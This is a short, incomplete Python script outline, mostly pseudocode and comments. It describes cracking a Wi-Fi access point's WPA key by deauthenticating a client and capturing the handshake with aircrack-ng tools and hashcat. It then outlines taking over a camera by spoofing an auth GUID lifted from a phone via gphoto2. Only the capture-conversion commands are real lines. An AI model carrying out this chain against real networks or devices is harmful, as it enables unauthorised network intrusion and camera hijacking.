#!/usr/bin/python3

# file imports
import guidTools, getAuthInfo

# initialize variables
phoneIP = "10.0.0.100"

############ PSUEDOCODE #################################
# Obtain network access
# references https://www.aircrack-ng.org/doku.php?id=airodump-ng
run airodump-ng on correct channel and mac n shit
if station is blank
    print client is not connected, waiting for client to connected
else
    print client is already connected, attempting deauth
    aireplay-ng client
while(aircrack exits with "no valid handshakes found, or no file or directory")
############ PSUEDOCODE #################################

# take captured cap and format for hashcat (old)
aircrack-ng psk-01.cap -J output

# take captured cap and format for hashcat 4
cap2hccapx.bin /path/to/psk-01.cap /path/to/output.hccapx

# call hashcat remotely
    # output the found key

# authenticate to the AP

# determine phone and camera IP address

# get guid from phone, if already connected we need to disconnect or getAuthInfo will fail
rawGUID = getAuthInfo(phoneIP)

# disconnect phone

# set GUID in gphoto2 from phone
setGUID(formatGUID(rawGUID))

# connect to camera ip and run ptp stuff via gphoto2
